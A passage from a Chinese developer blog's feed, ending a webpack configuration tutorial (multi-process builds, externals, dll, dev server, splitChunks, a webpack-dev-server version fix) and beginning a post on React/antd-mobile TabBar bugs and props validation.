<p>&#x4E0A;&#x8FF0;&#x7684; sw &#x4EE3;&#x7801;&#x5FC5;&#x987B;&#x8FD0;&#x884C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x53EF;&#x901A;&#x8FC7; serve &#x5FEB;&#x901F;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x5668;</p>
<pre><code class="language-shell">npm i serve -g
serve -s build # &#x542F;&#x52A8;&#x670D;&#x52A1;&#x5668;
</code></pre>
<ul>
<li>&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305;</li>
</ul>
<p>Js &#x4E3B;&#x7EBF;&#x7A0B;&#x5F15;&#x64CE;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684;&#xFF0C;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x53EA;&#x80FD;&#x505A;&#x4E00;&#x4EF6;&#x4E8B;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x591A;&#x8FDB;&#x7A0B;&#x4F18;&#x5316;&#x6253;&#x5305;&#x901F;&#x5EA6;&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5305;, &#x901A;&#x5E38;&#x7ED9; babel-loader &#x4F7F;&#x7528;
npm install --save-dev thread-loader
</code></pre>
<pre><code class="language-javascript">...{
  test: /\.js$/,
	exclude: /node_modules/,
	use: [
    /*&#x5F00;&#x542F;&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305;&#x3002; &#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x5927;&#x6982;&#x4E3A; 600ms&#xFF0C;&#x8FDB;&#x7A0B;&#x901A;&#x4FE1;&#x4E5F;&#x6709;&#x5F00;&#x9500;&#x3002; &#x53EA;&#x6709;&#x5DE5;&#x4F5C;&#x6D88;&#x8017;&#x65F6;&#x95F4;&#x6BD4;&#x8F83;&#x957F;&#xFF0C;&#x624D;&#x9700;&#x8981;&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305; */
    {
      loader: &apos;thread-loader&apos;,
      options: {
        workers: 2 // &#x8FDB;&#x7A0B; 2 &#x4E2A;
			}
    },...
</code></pre>
<p>&#x591A;&#x8FDB;&#x7A0B;&#x4E5F;&#x662F;&#x53CC;&#x5203;&#x5251;&#xFF0C;&#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x5927;&#x6982; 600ms &#xFF0C;&#x8FDB;&#x7A0B;&#x901A;&#x4FE1;&#x4E5F;&#x6709;&#x5F00;&#x9500;&#x3002;&#x53EA;&#x6709;&#x5DE5;&#x4F5C;&#x65F6;&#x95F4;&#x6D88;&#x8017;&#x6BD4;&#x8F83;&#x957F;&#xFF0C;&#x624D;&#x8FDB;&#x884C;&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305;&#x3002;</p>
<ul>
<li>externals</li>
</ul>
<p>&#x9632;&#x6B62;&#x5C06;&#x67D0;&#x4E9B;&#x5305;&#x6253;&#x5305;&#x8FDB;&#x6700;&#x7EC8;&#x7684; bundle.js &#x4E2D;&#x3002;</p>
<pre><code class="language-javascript">mode: &apos;production&apos;,
externals: { 
  // &#x62D2;&#x7EDD; jQuery &#x88AB;&#x6253;&#x5305;&#x8FDB;&#x6765; 
  // &#x5FFD;&#x7565;&#x5E93;&#x540D; -- npm &#x5305;&#x540D;
  jquery: &apos;jQuery&apos; 
}
</code></pre>
<ul>
<li>dll</li>
</ul>
<p>&#x5982;&#x679C;&#x5BF9;&#x7B2C;&#x4E09;&#x65B9;&#x5E93;&#xFF08;jquery&#x3001;react&#x3001;vue...&#xFF09;&#x6253;&#x5305;&#x6210;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4F53;&#x79EF;&#x4F1A;&#x592A;&#x5927;&#xFF0C;&#x901A;&#x8FC7; dll &#x53EF;&#x4EE5;&#x5C06;&#x5E93;&#x62C6;&#x5F00;&#x6253;&#x5305;&#x6210;&#x4E0D;&#x540C;&#x7684; chunk &#x6587;&#x4EF6;&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x63D2;&#x4EF6;
npm i add-asset-html-webpack-plugin -D
</code></pre>
<pre><code class="language-javascript">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
const webpack = require(&apos;webpack&apos;);
const AddAssetHtmlWebpackPlugin = require(&apos;add-asset-html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/index.js&apos;,
  output: {
    filename: &apos;built.js&apos;, path: resolve(__dirname, &apos;build&apos;)
  },
  plugins: [
    new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }),
    // &#x544A;&#x8BC9; webpack &#x54EA;&#x4E9B;&#x5E93;&#x4E0D;&#x53C2;&#x4E0E;&#x6253;&#x5305;&#xFF0C;&#x540C;&#x65F6;&#x4F7F;&#x7528;&#x65F6;&#x7684;&#x540D;&#x79F0;&#x4E5F;&#x5F97;&#x53D8;~ 
    new webpack.DllReferencePlugin({ manifest: resolve(__dirname, &apos;dll/manifest.json&apos;) }),
    // &#x5C06;&#x67D0;&#x4E2A;&#x6587;&#x4EF6;&#x6253;&#x5305;&#x8F93;&#x51FA;&#x53BB;&#xFF0C;&#x5E76;&#x5728; html &#x4E2D;&#x81EA;&#x52A8;&#x5F15;&#x5165;&#x8BE5;&#x8D44;&#x6E90; 
    new AddAssetHtmlWebpackPlugin({ filepath: resolve(__dirname, &apos;dll/jquery.js&apos;) }) ],
  mode: &apos;production&apos; 
};
</code></pre>
<p>&#x76F8;&#x6BD4;&#x4E8E; external &#x5F7B;&#x5E95;&#x4E0D;&#x6253;&#x5305;&#xFF0C;&#x9700;&#x8981; cdn &#x8FDE;&#x63A5;&#x8FDB;&#x6765;&#xFF0C;&#x800C; dll &#x9700;&#x8981;&#x6253;&#x5305;&#x4E00;&#x6B21;&#xFF0C;&#x5C06;&#x6765;&#x4E0D;&#x9700;&#x8981;&#x91CD;&#x590D;&#x6253;&#x5305;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="webpack">webpack &#x914D;&#x7F6E;&#x8BE6;&#x60C5;</h2>
<h3 id="entry">entry</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: {
    index: [&apos;./src/index.js&apos;, &apos;./src/count.js&apos;],
    add: &apos;./src/add.js&apos; 
  },
  output: { filename: &apos;[name].js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  // &#x5982;&#x679C;&#x4F20;&#x5165; template &#x4F1A;&#x4EE5;&#x67D0;&#x4E2A;&#x6587;&#x4EF6;&#x4E3A;&#x6A21;&#x677F;&#x53BB;&#x521B;&#x5EFA; html; &#x76F4;&#x63A5;&#x5199;&#x4F1A;&#x521B;&#x5EFA;&#x7A7A;&#x7684;&#x65B0; html &#x6587;&#x4EF6;
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;development&apos;
};
</code></pre>
<ol>
<li>string --&gt; &apos;./src/index.js&apos;&#xFF0C;&#x5355;&#x5165;&#x53E3;&#x6253;&#x5305;&#x5F62;&#x6210;&#x4E00;&#x4E2A; chunk&#x3002; &#x8F93;&#x51FA;&#x4E00;&#x4E2A; bundle &#x6587;&#x4EF6;&#x3002;&#x6B64;&#x65F6; chunk &#x7684;&#x540D;&#x79F0;&#x9ED8;&#x8BA4;&#x662F; main&#x3002;</li>
<li>array --&gt; [&apos;./src/index.js&apos;, &apos;./src/add.js&apos;]&#xFF0C;&#x591A;&#x5165;&#x53E3;&#x6240;&#x6709;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x6700;&#x7EC8;&#x53EA;&#x4F1A;&#x5F62;&#x6210;&#x4E00;&#x4E2A; chunk&#xFF0C;&#x8F93;&#x51FA;&#x51FA;&#x53BB;&#x53EA;&#x6709;&#x4E00;&#x4E2A; bundle &#x6587;&#x4EF6;&#x3002;&#xFF08;&#x4E00;&#x822C;&#x53EA;&#x7528;&#x5728; HMR &#x529F;&#x80FD;&#x4E2D;&#x8BA9; html &#x70ED;&#x66F4;&#x65B0;&#x751F;&#x6548;&#xFF09; <code>react:[&apos;react&apos;, &apos;react-dom&apos;, &apos;react-router-dom&apos;]</code></li>
<li>object&#xFF0C;&#x591A;&#x5165;&#x53E3;&#x6709;&#x51E0;&#x4E2A;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x5C31;&#x5F62;&#x6210;&#x51E0;&#x4E2A; chunk&#xFF0C;&#x8F93;&#x51FA;&#x51E0;&#x4E2A; bundle &#x6587;&#x4EF6;&#xFF0C;&#x6B64;&#x65F6; chunk &#x7684;&#x540D;&#x79F0;&#x662F; key &#x503C;&#x3002;</li>
<li>&#x7279;&#x6B8A;&#x7528;&#x6CD5;&#xFF1A;&#x591A;&#x5165;&#x53E3;&#x6253;&#x5305;&#x6210;&#x4E00;&#x4E2A; chunk&#xFF0C;&#x518D;&#x5206;&#x522B;&#x6253;&#x5305;</li>
</ol>
<pre><code class="language-javascript">entry: { // bundle &#x662F;&#x7531; chunk &#x7EC4;&#x6210;
  // &#x6700;&#x7EC8;&#x53EA;&#x4F1A;&#x5F62;&#x6210;&#x4E00;&#x4E2A;chunk, &#x8F93;&#x51FA;&#x51FA;&#x53BB;&#x53EA;&#x6709;&#x4E00;&#x4E2A;bundle&#x6587;&#x4EF6;
  index: [&apos;./src/index.js&apos;, &apos;./src/count.js&apos;], 
  // &#x5F62;&#x6210;&#x4E00;&#x4E2A;chunk, &#x8F93;&#x51FA;&#x4E00;&#x4E2A;bundle&#x6587;&#x4EF6;&#x3002;
  add: &apos;./src/add.js&apos;
}
</code></pre>
<h3 id="output">output</h3>
<pre><code class="language-javascript">output: {
  // &#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF08;&#x6307;&#x5B9A;&#x540D;&#x79F0;+&#x76EE;&#x5F55;&#xFF09;
  filename: &apos;js/[name].js&apos;,
  // &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#xFF08;&#x5C06;&#x6765;&#x6240;&#x6709;&#x8D44;&#x6E90;&#x8F93;&#x51FA;&#x7684;&#x516C;&#x5171;&#x76EE;&#x5F55;&#xFF09;
  path: resolve(__dirname, &apos;build&apos;),
  // &#x6240;&#x6709;&#x8D44;&#x6E90;&#x5F15;&#x5165;&#x516C;&#x5171;&#x8DEF;&#x5F84;&#x524D;&#x7F00; --&gt; &apos;imgs/a.jpg&apos; --&gt; &apos;/imgs/a.jpg&apos;
  publicPath: &apos;/&apos;,
  chunkFilename: &apos;js/[name]_chunk.js&apos;, // &#x6307;&#x5B9A;&#x975E;&#x5165;&#x53E3;chunk&#x7684;&#x540D;&#x79F0;
  library: &apos;[name]&apos;, // &#x6253;&#x5305;&#x6574;&#x4E2A;&#x5E93;&#x540E;&#x5411;&#x5916;&#x66B4;&#x9732;&#x7684;&#x53D8;&#x91CF;&#x540D;
  libraryTarget: &apos;window&apos; // &#x53D8;&#x91CF;&#x540D;&#x6DFB;&#x52A0;&#x5230;&#x54EA;&#x4E2A;&#x4E0A; browser&#xFF1A;window
  // libraryTarget: &apos;global&apos; // node&#xFF1A;global
  // libraryTarget: &apos;commonjs&apos; // conmmonjs&#x6A21;&#x5757; exports
},
</code></pre>
<h3 id="module">module</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/index.js&apos;,
  output: { filename: &apos;js/[name].js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: {
    rules: [
      // loader &#x7684;&#x914D;&#x7F6E;
      { test: /\.css$/,
       // &#x591A;&#x4E2A; loader &#x7528; use
       use: [&apos;style-loader&apos;, &apos;css-loader&apos;]
      },
      { test: /\.js$/,
       // &#x6392;&#x9664; node_modules &#x4E0B;&#x7684; js &#x6587;&#x4EF6;
       exclude: /node_modules/,
       // &#x53EA;&#x68C0;&#x67E5; src &#x4E0B;&#x7684; js &#x6587;&#x4EF6;
       include: resolve(__dirname, &apos;src&apos;),
       // &#x4F18;&#x5148;&#x6267;&#x884C;
       enforce: &apos;pre&apos;,
       // &#x5EF6;&#x540E;&#x6267;&#x884C; // enforce: &apos;post&apos;,
       // &#x5355;&#x4E2A; loader &#x7528; loader
       loader: &apos;eslint-loader&apos;,
       options: {}
      },
      { // &#x4EE5;&#x4E0B;&#x914D;&#x7F6E;&#x53EA;&#x4F1A;&#x751F;&#x6548;&#x4E00;&#x4E2A;
        oneOf: []
      }
    ]
  },
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;development&apos;
};
</code></pre>
<h3 id="resolve">resolve</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { filename: &apos;js/[name].js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: { rules: [ { test: /\.css$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;] } ] },
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;development&apos;,
  // &#x89E3;&#x6790;&#x6A21;&#x5757;&#x7684;&#x89C4;&#x5219;
  resolve: {
    // &#x914D;&#x7F6E;&#x89E3;&#x6790;&#x6A21;&#x5757;&#x8DEF;&#x5F84;&#x522B;&#x540D;: &#x4F18;&#x70B9;&#x7B80;&#x5199;&#x8DEF;&#x5F84; &#x7F3A;&#x70B9;&#x8DEF;&#x5F84;&#x6CA1;&#x6709;&#x63D0;&#x793A;
    alias: { $css: resolve(__dirname, &apos;src/css&apos;) },
    // &#x914D;&#x7F6E;&#x7701;&#x7565;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x7684;&#x540E;&#x7F00;&#x540D;
    extensions: [&apos;.js&apos;, &apos;.json&apos;, &apos;.jsx&apos;, &apos;.css&apos;],
    // &#x544A;&#x8BC9; webpack &#x89E3;&#x6790;&#x6A21;&#x5757;&#x662F;&#x53BB;&#x627E;&#x54EA;&#x4E2A;&#x76EE;&#x5F55; -- &#x5F53;&#x524D;&#x76EE;&#x5F55;&#x627E;&#x4E0D;&#x5230;&#x4F1A;&#x53BB;&#x4E0A;&#x4E00;&#x5C42;&#x76EE;&#x5F55;
    modules: [resolve(__dirname, &apos;../../node_modules&apos;), &apos;node_modules&apos;]
  }
};
</code></pre>
<h3 id="devserver">dev server</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { filename: &apos;js/[name].js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: { rules: [ { test: /\.css$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;] } ] },
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;development&apos;,
  resolve: {
    alias: { $css: resolve(__dirname, &apos;src/css&apos;) },
    extensions: [&apos;.js&apos;, &apos;.json&apos;, &apos;.jsx&apos;, &apos;.css&apos;],
    modules: [resolve(__dirname, &apos;../../node_modules&apos;), &apos;node_modules&apos;]
  },
  devServer: {
    // &#x8FD0;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x76EE;&#x5F55; contentBase: resolve(__dirname, &apos;build&apos;),
    // &#x76D1;&#x89C6; contentBase &#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x65E6;&#x6587;&#x4EF6;&#x53D8;&#x5316;&#x5C31;&#x4F1A; reload
    watchContentBase: true,
    watchOptions: {
      // &#x5FFD;&#x7565;&#x6587;&#x4EF6; &#x2014;&#x2014; &#x9AD8;&#x6548;
      ignored: /node_modules/
    },
    // &#x542F;&#x52A8; gzip &#x538B;&#x7F29;
    compress: true,
    // &#x7AEF;&#x53E3;&#x53F7;
    port: 5000,
    // &#x57DF;&#x540D;
    host: &apos;localhost&apos;,
    // &#x81EA;&#x52A8;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;
    open: true,
    // &#x5F00;&#x542F; HMR &#x529F;&#x80FD;
    hot: true,
    // &#x4E0D;&#x8981;&#x663E;&#x793A;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x5668;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;
    clientLogLevel: &apos;none&apos;,
    // &#x9664;&#x4E86;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x542F;&#x52A8;&#x4FE1;&#x606F;&#x4EE5;&#x5916;&#xFF0C;&#x5176;&#x4ED6;&#x5185;&#x5BB9;&#x90FD;&#x4E0D;&#x8981;&#x663E;&#x793A;
    quiet: true,
    // &#x5982;&#x679C;&#x51FA;&#x9519;&#x4E86;&#xFF0C;&#x4E0D;&#x8981;&#x5168;&#x5C4F;&#x63D0;&#x793A;~
    overlay: false,
    // &#x670D;&#x52A1;&#x5668;&#x4EE3;&#x7406; --&gt; &#x89E3;&#x51B3;&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x8DE8;&#x57DF;&#x95EE;&#x9898;
    proxy: {
      // &#x4E00;&#x65E6; devServer(5000)&#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7;&#x5230; /api/xxx &#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5C31;&#x4F1A;&#x628A;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668; (3000)
      &apos;/api&apos;: { target: &apos;http://localhost:3000&apos;,
               // &#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8BF7;&#x6C42;&#x8DEF;&#x5F84;&#x91CD;&#x5199;&#xFF1A;&#x5C06; /api/xxx --&gt; /xxx &#xFF08;&#x53BB;&#x6389;/api&#xFF09;
               pathRewrite: { &apos;^/api&apos;: &apos;&apos; }
              }
    }
  }
};
</code></pre>
<h3 id="optimization">optimization</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
const TerserWebpackPlugin = require(&apos;terser-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/[name].[contenthash:10].js&apos;,
    path: resolve(__dirname, &apos;build&apos;),
    chunkFilename: &apos;js/[name].[contenthash:10]_chunk.js&apos;
  },
  module: { rules: [ { test: /\.css$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;] } ] },
  plugins: [new HtmlWebpackPlugin()],
  mode: &apos;production&apos;,
  resolve: {
    alias: {
      $css: resolve(__dirname, &apos;src/css&apos;)
    },
    extensions: [&apos;.js&apos;, &apos;.json&apos;, &apos;.jsx&apos;, &apos;.css&apos;],
    modules: [resolve(__dirname, &apos;../../node_modules&apos;), &apos;node_modules&apos;]
  },
  optimization: {
    splitChunks: {
      chunks: &apos;all&apos; // &#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x5199;~ ,
      minSize: 30 * 1024, // &#x5206;&#x5272;&#x7684; chunk &#x6700;&#x5C0F;&#x4E3A; 30kb
      maxSize: 0, // &#x6700;&#x5927;&#x6CA1;&#x6709;&#x9650;&#x5236;
      minChunks: 1, // &#x8981;&#x63D0;&#x53D6;&#x7684; chunk &#x6700;&#x5C11;&#x88AB;&#x5F15;&#x7528; 1 &#x6B21;
      maxAsyncRequest: 5, // &#x6309;&#x9700;&#x52A0;&#x8F7D;&#x5E76;&#x884C;&#x52A0;&#x8F7D;&#x6587;&#x4EF6;&#x6700;&#x5927;&#x6570;&#x91CF;
      maxInitialRequests: 3, // &#x5165;&#x53E3;js&#x6587;&#x4EF6;&#x6700;&#x5927;&#x5E76;&#x884C;&#x8BF7;&#x6C42;&#x6570;&#x91CF;
      automaticNameDelimiter: &apos;~&apos; , // &#x540D;&#x79F0;&#x8FDE;&#x63A5;&#x7B26;
      name: true, // &#x53EF;&#x4EE5;&#x547D;&#x540D;&#x89C4;&#x5219;
      cacheGroups: { // &#x5206;&#x5272;chunk&#x7EC4;
      	vendors&#xFF1A;{ // node_modules&#x6587;&#x4EF6;&#x88AB;&#x6253;&#x5305;&#x5230; vendors &#x7EC4;&#x7684; chunk &#x4E2D; --&gt; vendors~xxx.js
      		test: /[||/]node_modules[\\/]/,
      		priority: -10
   			},
    		default: {
      		minChunks: 2, // &#x88AB;&#x63D0;&#x53D6;&#x7684; chunk &#x81F3;&#x5C11;&#x88AB;&#x5F15;&#x7528;&#x4E24;&#x6B21;
          priority: -10,
          // &#x5F53;&#x524D;&#x6253;&#x5305;&#x6728;&#x5757;&#x548C;&#x4E4B;&#x524D;&#x88AB;&#x63D0;&#x53D6;&#x6A21;&#x5757;&#x662F;&#x540C;&#x4E00;&#x4E2A;&#x5219;&#x53EF;&#x4EE5;&#x590D;&#x7528;
          reuseExistingChunk: true
    		}
    	}
    },
    // &#x5C06;&#x5F53;&#x524D;&#x6A21;&#x5757;&#x7684;&#x8BB0;&#x5F55;&#x5176;&#x4ED6;&#x6A21;&#x5757;&#x7684; hash &#x5355;&#x72EC;&#x6253;&#x5305;&#x4E3A;&#x4E00;&#x4E2A;&#x6587;&#x4EF6; runtime
    // &#x89E3;&#x51B3;&#xFF1A;&#x4FEE;&#x6539; a &#x6587;&#x4EF6;&#x5BFC;&#x81F4; b &#x6587;&#x4EF6;&#x7684; contenthash &#x53D8;&#x5316; -- &#x67D0;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4FEE;&#x6539;&#x5BFC;&#x81F4; hash &#x53D8;&#x5316;&#x5BFC;&#x81F4;&#x7F13;&#x5B58;&#x5931;&#x6548;
    runtimeChunk: { name: entrypoint =&gt; `runtime-${entrypoint.name}` },
    minimizer: [
      // &#x914D;&#x7F6E;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x7684;&#x538B;&#x7F29;&#x65B9;&#x6848;&#xFF1A;js &#x548C; css
      new TerserWebpackPlugin({
        // &#x5F00;&#x542F;&#x7F13;&#x5B58;
        cache: true,
        // &#x5F00;&#x542F;&#x591A;&#x8FDB;&#x7A0B;&#x6253;&#x5305;
        parallel: true,
        // &#x542F;&#x52A8; source-map
        sourceMap: true })
    ]
  }
}; 
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="webpackdevserver">webpack-dev-server&#x517C;&#x5BB9;&#x95EE;&#x9898;</h2>
<p>&#x8FD0;&#x884C;<code>webpack-dev-server</code>&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x62A5;&#x9519;</p>
<pre><code class="language-javascript">&gt; webpack-dev-server

internal/modules/cjs/loader.js:883
  throw err;
  ^

Error: Cannot find module &apos;webpack-cli/bin/config-yargs&apos;
</code></pre>
<p>&#x62A5;&#x9519;&#x5185;&#x5BB9;&#x4E3A;&#x627E;&#x4E0D;&#x5230; webpack-cli &#x4E2D;&#x5BF9;&#x5E94;&#x6A21;&#x5757;&#x3002;&#x62A5;&#x9519;&#x65F6;&#x9879;&#x76EE;&#x76F8;&#x5E94; webpack &#x914D;&#x7F6E;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code class="language-javascript">&quot;webpack&quot;: &quot;^5.24.3&quot;,
&quot;webpack-cli&quot;: &quot;^4.5.0&quot;,
&quot;webpack-dev-server&quot;: &quot;^3.11.2&quot;
</code></pre>
<p>&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF1A;</p>
<ul>
<li>&#x65B9;&#x6CD5;&#x4E00;:&#x91CD;&#x88C5; webpack-cli &#x4E0E; webpack-dev-server &#x517C;&#x5BB9;&#x7684;&#x7248;&#x672C;;</li>
<li>&#x65B9;&#x6CD5;&#x4E8C;:&#x4FEE;&#x6539; <code>package.json</code> &#x6587;&#x4EF6;&#x4E2D; <code>&quot;script&quot;</code> &#x9879;</li>
</ul>
<p>&#x65B9;&#x6CD5;&#x4E8C;&#x6B65;&#x9AA4;&#x3002;</p>
<pre><code>// package.json &#x914D;&#x7F6E;&#x6587;&#x4EF6; &quot;script&quot; &#x4E2D;&#x4FEE;&#x6539; &quot;dev&quot; &#x9879;&#x503C; &quot;webpack-dev-server&quot; &#x4E3A; &quot;webpack serve --open Chrome&quot;
</code></pre>
<p>&#x5728;&#x91CD;&#x65B0;&#x914D;&#x7F6E;&#x5B8C;&#x540E;<code>Terminal</code>&#x8F93;&#x5165;&#xFF1A;<br>
<code>npm run dev</code><br>
&#x7ECF;&#x6D4B;&#x8BD5;&#xFF0C;&#x6B64;&#x65F6;&#x53EF;&#x6B63;&#x5E38;&#x5B9E;&#x65F6;&#x66F4;&#x65B0;&#x4FEE;&#x6539;&#x7684;js&#x6587;&#x4EF6;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id>&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 &#x534F;&#x8BAE;</a> &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[⚛️React解忧杂货店]]></title><description><![CDATA[React项目常见Bugs解决]]></description><link>yourdomain.com/reactbugs/</link><guid isPermaLink="false">60f6b68a6aa9bdead2d22794</guid><category><![CDATA[BUG handled]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Thu, 04 Mar 2021 11:42:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/08/fullmoon-1.jpeg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><img src="yourdomain.com/content/images/2021/08/fullmoon-1.jpeg" alt="&#x269B;&#xFE0F;React&#x89E3;&#x5FE7;&#x6742;&#x8D27;&#x5E97;"><p>React &#x4F7F;&#x7528; antd-mobile &#x5F00;&#x53D1;&#x79FB;&#x52A8;&#x7AEF;&#x9879;&#x76EE;&#x65F6;&#xFF0C;&#x5728;&#x90E8;&#x5206;&#x754C;&#x9762;&#x7528;&#x5D4C;&#x5957;&#x8DEF;&#x7531;&#xFF08;&#x4E0D;&#x540C;&#x9875;&#x9762;&#x6E32;&#x67D3;&#x5185;&#x5BB9; + TavBar&#x6052;&#x56FA;&#x5B9A;&#xFF09;&#x65F6;&#x51FA;&#x73B0;&#x70B9;&#x51FB;&#x65E0;&#x6548;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x7ECF;&#x68C0;&#x6D4B;&#x662F; antd-mobile &#x4E2D; <a href="https://mobile.ant.design/components/tab-bar-cn/#components-tab-bar-demo-basic">TabBar</a> &#x7EC4;&#x4EF6;&#x5E26;&#x6709;&#x4E00;&#x4E2A;&#x68C0;&#x6D4B;&#x7F29;&#x653E;&#x6EE1;&#x5C4F;&#x5C5E;&#x6027; fullScreen &#x7684;&#x76D2;&#x5B50;&#x5C06; TabBar &#x5143;&#x7D20;&#x5305;&#x88F9;&#x3002;&#x5373;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code class="language-html">&lt;div style=&quot;position: fixed; height: 100%; width: 100%; top: 0px;&quot;&gt;
 ...
&lt;/div&gt;
</code></pre>
<p>&#x8FD9;&#x91CC;&#x770B;&#x5230;&#x4E00;&#x4E2A;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x8BBE;&#x7F6E; <code>z-index:-1</code> &#x3002;&#x5F53;&#x7136;&#x5728; JSX &#x884C;&#x5185;&#x5143;&#x7D20;&#x8BBE;&#x7F6E;&#x52A1;&#x5FC5;&#x6839;&#x636E;&#x9A7C;&#x5CF0;&#x5199;&#x6CD5;&#x6765;&#x8BBE;&#x7F6E;&#x6210; <code>zIndex:-1</code> &#xFF0C;&#x4F46;&#x662F;&#x7ECF;&#x672C;&#x4EBA;&#x5B9E;&#x8DF5;&#xFF0C;&#x6B21;&#x65B9;&#x6CD5;&#x4F1A;&#x5C06; TabBar &#x76F4;&#x63A5;&#x9690;&#x85CF;&#xFF0C;&#x6545;&#x4E0D;&#x53EF;&#x53D6;&#x3002;</p>
<p>&#x5B9E;&#x9645;&#x8FD9;&#x4E00;&#x5904;&#x7684;&#x4EE3;&#x7801;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x6F14;&#x793A;&#x6839;&#x636E;&#x70B9;&#x51FB;&#x6807;&#x7B7E;&#x800C;&#x66F4;&#x6539; TabBar &#x7684;&#x653E;&#x7F6E;&#x4F4D;&#x7F6E;&#xFF0C;&#x82E5;&#x4E0D;&#x9700;&#x8981;&#x8FD8;&#x662F;&#x76F4;&#x63A5;&#x53BB;&#x9664;&#x8FD9;&#x4E2A;&#x5305;&#x88F9;&#x5BB9;&#x5668;&#x5373;&#x53EF;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="props-%E6%A0%A1%E9%AA%8C">props &#x6821;&#x9A8C;</h2>
<p>&#x81EA;&#x884C;&#x5C01;&#x88C5;&#x7684;&#x7EC4;&#x4EF6;&#x8FDB;&#x884C; <a href="https://zh-hans.reactjs.org/docs/typechecking-with-proptypes.html">props &#x6821;&#x9A8C;</a>&#xFF1A;</p>
<ol>
